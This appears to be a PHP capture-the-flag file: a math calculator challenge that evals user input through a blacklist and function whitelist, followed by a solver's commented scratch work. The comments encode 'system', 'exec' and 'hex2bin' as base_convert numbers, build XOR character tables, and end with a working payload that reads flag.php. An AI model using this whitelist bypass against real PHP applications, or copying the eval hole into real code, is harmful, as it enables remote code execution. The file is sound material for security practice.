<?php

error_reporting(0);

//听说你很喜欢数学，不知道你是否爱它胜过爱flag
if (!isset($_GET['c'])) {
	// show_source(__FILE__);
} else {
	// show_source(__FILE__);
	//例子 c=20-1
	$content = $_GET['c'];
	// print_r('echo ' . $content . ';\r\n<br>');
	// eval('echo ' . $content . ';');
	// die;
	if (strlen($content) >= 80) {
		die("太长了不会算");
	}
	$blacklist = ['\t', '\r', '\n', '\'', '"', '`', '\[', '\]'];
	foreach ($blacklist as $blackitem) {
		if (preg_match('/' . $blackitem . '/m', $content)) {
			die("请不要输入奇奇怪怪的字符");
		}
	}
	//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp
	$whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh', 'echo'];
	preg_match_all('/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/', $content, $used_funcs);
	// print_r($used_funcs);
	foreach ($used_funcs[0] as $func) {
		if (!in_array($func, $whitelist)) {
			print_r($func);
			die("请不要输入奇奇怪怪的函数");
		}
	}
	//帮你算出答案
	// print_r('echo ' . $content . ';');
	eval('echo ' . $content . ';');
	exit;
}
// die;
// error_reporting(E_ALL);
// echo base_convert(37907361743, 10, 36)(77);
// get_defined_vars()
// echo base_convert(696468, 10, 36)(base_convert(37907361743, 10, 36)(77));
// $_GET[1] 2620891871246496093
// $content = "base_convert(696468,10,36)(base_convert(37907361743,10,36)(dechex(66)))";
// $xxx = ["hd *", "hd f*", "dd"];
// foreach ($xxx as $v) {
// 	echo hexdec(bin2hex($v)) . "\r\n";
// }
// env 19003
// getenv 992345467
// cat    15941
// exec   696468
// popen  43143071
// system 1751504350
// eval 693741
// phpinfo 55490343972
$a = hexdec(bin2hex('_GET'));
// echo $a . "\r\n";
// echo hex2bin(dechex($a)) . "\r\n\r\n";
// echo $a . "\r\n\r\n";
// $a =
// echo hex2bin(dechex(1751392298)) . "\r\n";
// eval 693741
// base_convertbase_convert
// 1;$pi=base_convert;$pi$pi
// $pi = $_;
// print_r($pi);
// $content = "base_convert(693741,10,36)(base_convert(37907361743,10,36)(dechex($a)))";
// $content = '$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){0}(($$pi){1})';
// $content = '1;$pi=base_convert(37907361743,10,36);base_convert(693741,10,36)($pi(66))';
// $content = '1;$pi=base_convert;$pi(1751504350,10,36)($pi(37907361743,10,36)(dechex(1751392298)))';
// $content = "tan(base_convert(37907361743,10,36)(dechex(106001472694880)))";
// echo strlen($content) . "\r\n";
// $pi=base_convert;$pi(696468,10,36)($pi(37907361743,10,36)(dechex(1751392298)))
// if (strlen($content) >= 80) {
// 	die("\r\n太长了不会算 : ");
// }
// print('echo ' . $content . ";\r\n");
// eval('echo ' . $content . ';');
// echo "\r\n\r\n\r\n";
// die();
$pl = $content;
// exit;
// $URL = 'http://cc3e987aecc2418293966d382f710bbedc715a47280a41d9.changame.ichunqiu.com/calc.php?c=';
if (strlen($content) < 80) {
	// echo file_get_contents($URL . $pl);
} else {
	die("\r\n太长了不会算 : ");
}

// echo "\r\n\r\n";
// eval($_GET[1])
// echo bin2hex("\$_GET[1]") . "\r\n";
// 245f4745545b315d
// echo hexdec('245f4745545b315d') . "\r\n";
// echo base_convert(693741, 10, 36)(base_convert(37907361743, 10, 36)(dechex(2620891871246496093))) . "\r\n";
// echo base_convert('popen', 36, 10) . "\r\n";
// 41947908551893
// system(ls|xargs cat)
// echo base_convert(696468,10,36)(base_convert(37907361743,10,36)));
// foreach (["p", "h", "p", "i", "n", "f", "o"] as $value) {
// 	// print_r($value);
// 	echo "\\" . hexdec(bin2hex($value));
// 	# code...
// }
// $x = ""
// $x = ["a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z"];
// for ($i = 0; $i < 255; $i++) {
// 	for ($j = 0; $j < 255; $j++) {
// 		$t = dechex($j) ^ dechex($i);
// 		// if (in_array($t, $x)) {
// 		echo $j . " - " . $i . " - " . $t . " - " . urlencode($t) . "\r\n";
// 		// }

// 	}
// }
// echo dechex(10) ^ dechex(100);

/**
dechex(-1) ^ dechex($i)
0 - V
1 - W
2 - T
3 - U
4 - R
5 - S
6 - P
7 - Q
8 - ^
9 - _
150 - _P
dechex(20) ^ dechex($i) ^ dechex(99)
10 - f
11 - e
12 - d
13 - c
14 - b
15 - a
dechex(20) ^ dechex($i) ^ dechex(66)
11 - g
8 - 14 - ] - %5D
9 - 14 - \ - %5C
8 - 17 -   - %09
(dechex(8)^dechex(17))
 */
//dechex(8)^dechex(12) [
//dechex(8)^dechex(14) ]
// $content = "system(ls)";
// echo '*' ^ dechex(10)^ dechex(10);
// for ($j = 0; $j < 255; $j++) {
// 	$t = dechex($j ^ 88) ^ '*';
// 	echo $j . " - " . $t . " - " . hexdec(bin2hex($t)) . "\r\n";
// }
// echo dechex(59 ^ 66) ^ dechex(72);
// current(get_defined_vars())
// $abs=end(current(get_defined_vars()));base_convert(1751504350,10,36)($abs)
// echo base_convert('*', 36, 10) . "\r\n";
// env 19003
// getenv 992345467
// system 1751504350
// exec 696468
// cat 15941
// phpinfo 55490343972
// hex2bin 37907361743
// 41947908551893
// echo base_convert(37907361743, 10, 36);
// system(ls|xargs cat)
// echo base_convert(696468,10,36)(base_convert(55490343972,10,36)));
// 1;$abs=base_convert(992340201,10,36).base_convert(37869248008,10,36);print_r(end($abs()))
// $_GET[0]($_GET[1])
// $_GET{0}($_GET{1})
$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){0}(($$pi){1});&0=show_source&1=flag.php